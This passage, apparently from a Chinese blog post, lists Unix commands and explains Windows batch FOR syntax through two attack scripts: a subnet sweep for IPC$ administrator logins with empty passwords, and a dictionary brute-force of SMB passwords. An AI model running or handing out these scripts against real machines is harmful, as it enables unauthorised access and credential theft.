设定档案或目录的存取权限 grep 在档案中查找字符串 diff 档案文件比较 find 档案搜寻 date 现在的日期、时间 who 查询目前和你使用同一台机器的人以及Login时间地点 w 查询目前上机者的详细资料 whoami 查看自己的帐号名称 groups 查看某人的Group passwd 更改密码 history 查看自己下过的命令 ps 显示进程状态 kill 停止某进程 gcc 黑客通常用它来编译C语言写的文件 su 权限转换为指定使用者 telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 ftp ftp连接上某服务器（同win2K） 批处理命令与变量 1：for命令及变量 基本格式 FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。 批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3 (set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 } command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开 command_parameters：为特定命令指定参数或命令行开关 IN (set)：指在(set)中取值；DO command ：指执行command 参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。 用法举例： @echo off echo 用法格式：test.bat ..* &gt; test.txt for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use %1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt 存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。 /L指用增量形式（即从1-254或254-1）；输入的IP前面三位：..*为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 @echo off echo 用法格式：ok.bat ip FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200 存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。 ####以上。","categories":[],"tags":[{"name":"Windows系列","slug":"Windows系列","permalink":"http://yoursite.com/tags/Windows%E7%B3%BB%E5%88%97/"}]}]}